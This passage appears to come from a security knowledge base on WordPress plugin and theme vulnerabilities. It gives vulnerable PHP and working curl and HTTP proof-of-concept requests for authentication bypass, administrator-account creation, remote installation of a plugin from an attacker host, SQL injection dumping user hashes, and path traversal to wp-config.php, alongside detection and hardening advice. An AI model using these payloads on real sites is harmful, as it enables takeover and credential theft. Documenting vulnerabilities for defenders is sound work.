  \ flawed pattern (simplified)\n\n```php\npublic function check_login() {\n    // ... request parsing ...\n    switch ($_POST['using'])\
  \ {\n        case 'fb':     /* set $user_email from verified Facebook token */ break;\n        case 'google': /* set $user_email\
  \ from verified Google token   */ break;\n        // other providers ...\n        default: /* unsupported/missing provider\
  \ – execution continues */ break;\n    }\n\n    // FALLBACK: trust POSTed \"id\" as email if provider data missing\n   \
  \ $user_email = !empty($user_email)\n        ? $user_email\n        : (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');\n\
  \n    if (empty($user_email)) {\n        wp_send_json(['status' => 'not_user']);\n    }\n\n    $user = get_user_by('email',\
  \ $user_email);\n    if ($user) {\n        wp_set_auth_cookie($user->ID, true); // \U0001F525 logs requester in as that\
  \ user\n        wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);\n    }\n    wp_send_json(['status'\
  \ => 'not_user']);\n}\n// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);\n```\n\nWhy it’s exploitable\n\
  \n- Unauthenticated reachability via admin-ajax.php (wp_ajax_nopriv_… action).\n- No nonce/capability checks before state\
  \ change.\n- Missing OAuth/OpenID provider verification; default branch accepts attacker input.\n- get_user_by('email',\
  \ $_POST['id']) followed by wp_set_auth_cookie($uid) authenticates the requester as any existing email address.\n\nExploitation\
  \ (unauthenticated)\n\n- Prerequisites: attacker can reach /wp-admin/admin-ajax.php and knows/guesses a valid user email.\n\
  - Set provider to an unsupported value (or omit it) to hit the default branch and pass id=<victim_email>.\n\n```http\nPOST\
  \ /wp-admin/admin-ajax.php HTTP/1.1\nHost: victim.tld\nContent-Type: application/x-www-form-urlencoded\n\naction=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com\n\
  ```\n\n```bash\ncurl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \\\n  -d \"action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com\"\
  \n```\n\nExpected success indicators\n\n- HTTP 200 with JSON body like {\"status\":\"success\",\"message\":\"Login successfully.\"\
  }.\n- Set-Cookie: wordpress_logged_in_* for the victim user; subsequent requests are authenticated.\n\nFinding the action\
  \ name\n\n- Inspect the theme/plugin for add_action('wp_ajax_nopriv_...', '...') registrations in social login code (e.g.,\
  \ framework/add-ons/social-login/class-social-login.php).\n- Grep for wp_set_auth_cookie(), get_user_by('email', ...) inside\
  \ AJAX handlers.\n\nDetection checklist\n\n- Web logs showing unauthenticated POSTs to /wp-admin/admin-ajax.php with the\
  \ social-login action and id=<email>.\n- 200 responses with the success JSON immediately preceding authenticated traffic\
  \ from the same IP/User-Agent.\n\nHardening\n\n- Do not derive identity from client input. Only accept emails/IDs originating\
  \ from a validated provider token/ID.\n- Require CSRF nonces and capability checks even for login helpers; avoid registering\
  \ wp_ajax_nopriv_ unless strictly necessary.\n- Validate and verify OAuth/OIDC responses server-side; reject missing/invalid\
  \ providers (no fallback to POST id).\n- Consider temporarily disabling social login or virtually patching at the edge (block\
  \ the vulnerable action) until fixed.\n\nPatched behaviour (Jobmonster 4.8.0)\n\n- Removed the insecure fallback from $_POST['id'];\
  \ $user_email must originate from verified provider branches in switch($_POST['using']).\n\n## Unauthenticated privilege\
  \ escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers ≤ 1.0.82)\n\nSome plugins expose REST\
  \ endpoints that mint reusable “connection keys” or tokens without verifying the caller’s capabilities. If the route authenticates\
  \ only on a guessable attribute (e.g., username) and does not bind the key to a user/session with capability checks, any\
  \ unauthenticated attacker can mint a key and invoke privileged actions (admin account creation, plugin actions → RCE).\n\
  \n- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection\n- Flaw: accepts a username, issues a connection\
  \ key without current_user_can() or a strict permission_callback\n- Impact: full takeover by chaining the minted key to\
  \ internal privileged actions\n\nPoC – mint a connection key and use it\n\n```bash\n# 1) Obtain key (unauthenticated). Exact\
  \ payload varies per plugin\ncurl -s -X POST \"https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection\"\
  \ \\\n  -H 'Content-Type: application/json' \\\n  --data '{\"username\":\"admin\"}'\n# → {\"key\":\"<conn_key>\", ...}\n\
  \n# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)\ncurl -s -X POST \"https://victim.tld/wp-json/sure-triggers/v1/users\"\
  \ \\\n  -H 'Content-Type: application/json' \\\n  -H 'X-Connection-Key: <conn_key>' \\\n  --data '{\"username\":\"pwn\"\
  ,\"email\":\"p@t.ld\",\"password\":\"p@ss\",\"role\":\"administrator\"}'\n```\n\nWhy it’s exploitable\n- Sensitive REST\
  \ route protected only by low-entropy identity proof (username) or missing permission_callback\n- No capability enforcement;\
  \ minted key is accepted as a universal bypass\n\nDetection checklist\n- Grep plugin code for register_rest_route(..., [\
  \ 'permission_callback' => '__return_true' ])\n- Any route that issues tokens/keys based on request-supplied identity (username/email)\
  \ without tying to an authenticated user or capability\n- Look for subsequent routes that accept the minted token/key without\
  \ server-side capability checks\n\nHardening\n- For any privileged REST route: require permission_callback that enforces\
  \ current_user_can() for the required capability\n- Do not mint long-lived keys from client-supplied identity; if needed,\
  \ issue short-lived, user-bound tokens post-authentication and recheck capabilities on use\n- Validate the caller’s user\
  \ context (wp_set_current_user is not sufficient alone) and reject requests where !is_user_logged_in() || !current_user_can(<cap>)\n\
  \n---\n\n## Nonce gate misuse → unauthenticated arbitrary plugin installation (FunnelKit Automations ≤ 3.5.3)\n\nNonces\
  \ prevent CSRF, not authorization. If code treats a nonce pass as a green light and then skips capability checks for privileged\
  \ operations (e.g., install/activate plugins), unauthenticated attackers can meet a weak nonce requirement and reach RCE\
  \ by installing a backdoored or vulnerable plugin.\n\n- Vulnerable path: plugin/install_and_activate\n- Flaw: weak nonce\
  \ hash check; no current_user_can('install_plugins'|'activate_plugins') once nonce “passes”\n- Impact: full compromise via\
  \ arbitrary plugin install/activation\n\nPoC (shape depends on plugin; illustrative only)\n\n```bash\ncurl -i -s -X POST\
  \ https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \\\n  -H 'Content-Type: application/json' \\\n \
  \ --data '{\"_nonce\":\"<weak-pass>\",\"slug\":\"hello-dolly\",\"source\":\"https://attacker.tld/mal.zip\"}'\n```\n\nDetection\
  \ checklist\n- REST/AJAX handlers that modify plugins/themes with only wp_verify_nonce()/check_admin_referer() and no capability\
  \ check\n- Any code path that sets $skip_caps = true after nonce validation\n\nHardening\n- Always treat nonces as CSRF\
  \ tokens only; enforce capability checks regardless of nonce state\n- Require current_user_can('install_plugins') and current_user_can('activate_plugins')\
  \ before reaching installer code\n- Reject unauthenticated access; avoid exposing nopriv AJAX actions for privileged flows\n\
  \n### Subscriber+ AJAX plugin installer → forced malicious activation (Motors Theme ≤ 5.6.81)\n\n[Patchstack's analysis](https://patchstack.com/articles/critical-arbitrary-file-upload-vulnerability-in-motors-theme-affecting-20k-sites/)\
  \ showed how the Motors theme ships an authenticated AJAX helper for installing its companion plugin:\n\n```php\nadd_action('wp_ajax_mvl_theme_install_base',\
  \ 'mvl_theme_install_base');\n\nfunction mvl_theme_install_base() {\n    check_ajax_referer('mvl_theme_install_base', 'nonce');\n\
  \n    $plugin_url  = sanitize_text_field($_GET['plugin']);\n    $plugin_slug = 'motors-car-dealership-classified-listings';\n\
  \n    $upgrader = new Plugin_Upgrader(new Motors_Theme_Plugin_Upgrader_Skin(['plugin' => $plugin_slug]));\n    $upgrader->install($plugin_url);\n\
  \    mvl_theme_activate_plugin($plugin_slug);\n}\n```\n\n- Only `check_ajax_referer()` is called; there is no `current_user_can('install_plugins')`\
  \ or `current_user_can('activate_plugins')`.\n- The nonce is embedded in the Motors admin page, so any Subscriber that can\
  \ open `/wp-admin/` can copy it from the HTML/JS.\n- The handler trusts the attacker-controlled `plugin` parameter (read\
  \ from `$_GET`) and passes it into `Plugin_Upgrader::install()`, so an arbitrary remote ZIP is downloaded into `wp-content/plugins/`.\n\
  - After installation the theme unconditionally calls `mvl_theme_activate_plugin()`, guaranteeing execution of the attacker\
  \ plugin's PHP code.\n\n#### Exploitation flow\n\n1. Register/compromise a low-privileged account (Subscriber is enough)\
  \ and grab the `mvl_theme_install_base` nonce from the Motors dashboard UI.\n2. Build a plugin ZIP whose top-level directory\
  \ matches the expected slug `motors-car-dealership-classified-listings/` and embed a backdoor or webshell in the `*.php`\
  \ entry points.\n3. Host the ZIP and trigger the installer by pointing the handler to your URL:\n\n```http\nPOST /wp-admin/admin-ajax.php\
  \ HTTP/1.1\nHost: victim.tld\nCookie: wordpress_logged_in_=...\nContent-Type: application/x-www-form-urlencoded\n\naction=mvl_theme_install_base&nonce=<leaked_nonce>&plugin=https%3A%2F%2Fattacker.tld%2Fmotors-car-dealership-classified-listings.zip\n\
  ```\n\nBecause the handler reads `$_GET['plugin']`, the same payload can also be sent via the query string.\n\n#### Detection\
  \ checklist\n\n- Search themes/plugins for `Plugin_Upgrader`, `Theme_Upgrader`, or custom `install_plugin.php` helpers wired\
  \ to `wp_ajax_*` hooks without capability checks.\n- Inspect any handler that takes a `plugin`, `package`, `source`, or\
  \ `url` parameter and feeds it into upgrader APIs, especially when the slug is hard-coded but the ZIP contents are not validated.\n\
  - Review admin pages that expose nonces for installer actions—if Subscribers can load the page, assume the nonce leaks.\n\
  \n#### Hardening\n\n- Gate installer AJAX callbacks with `current_user_can('install_plugins')` and `current_user_can('activate_plugins')`\
  \ after nonce verification; Motors 5.6.82 introduced this check to patch the bug.\n- Refuse untrusted URLs: limit installers\
  \ to bundled ZIPs or trusted repositories, or enforce signed download manifests.\n- Treat nonces strictly as CSRF tokens;\
  \ they do not provide authorization and should never replace capability checks.\n\n---\n\n## Unauthenticated SQLi via s\
  \ search parameter in depicter-* actions (Depicter Slider ≤ 3.6.1)\n\nMultiple depicter-* actions consumed the s (search)\
  \ parameter and concatenated it into SQL queries without parameterization.\n\n- Parameter: s (search)\n- Flaw: direct string\
  \ concatenation in WHERE/LIKE clauses; no prepared statements/sanitization\n- Impact: database exfiltration (users, hashes),\
  \ lateral movement\n\nPoC\n\n```bash\n# Replace action with the affected depicter-* handler on the target\ncurl -G \"https://victim.tld/wp-admin/admin-ajax.php\"\
  \ \\\n  --data-urlencode 'action=depicter_search' \\\n  --data-urlencode \"s=' UNION SELECT user_login,user_pass FROM wp_users--\
  \ -\"\n```\n\nDetection checklist\n- Grep for depicter-* action handlers and direct use of $_GET['s'] or $_POST['s'] in\
  \ SQL\n- Review custom queries passed to $wpdb->get_results()/query() concatenating s\n\nHardening\n- Always use $wpdb->prepare()\
  \ or wpdb placeholders; reject unexpected metacharacters server-side\n- Add a strict allowlist for s and normalize to expected\
  \ charset/length\n\n---\n\n## Unauthenticated Local File Inclusion via unvalidated template/file path (Kubio AI Page Builder\
  \ ≤ 2.5.1)\n\nAccepting attacker-controlled paths in a template parameter without normalization/containment allows reading\
  \ arbitrary local files, and sometimes code execution if includable PHP/log files are pulled into runtime.\n\n- Parameter:\
  \ __kubio-site-edit-iframe-classic-template\n- Flaw: no normalization/allowlisting; traversal permitted\n- Impact: secret\
  \ disclosure (wp-config.php), potential RCE in specific environments (log poisoning, includable PHP)\n\nPoC – read wp-config.php\n\
  \n```bash\ncurl -i \"https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php\"\n```\n\n\
  Detection checklist\n- Any handler concatenating request paths into include()/require()/read sinks without realpath() containment\n\
  - Look for traversal patterns (../) reaching outside the intended templates directory\n\nHardening\n- Enforce allowlisted\
  \ templates; resolve with realpath() and require str_starts_with(realpath(file), realpath(allowed_base))\n- Normalize input;\
  \ reject traversal sequences and absolute paths; use sanitize_file_name() only for filenames (not full paths)\n\n\n## References\n\
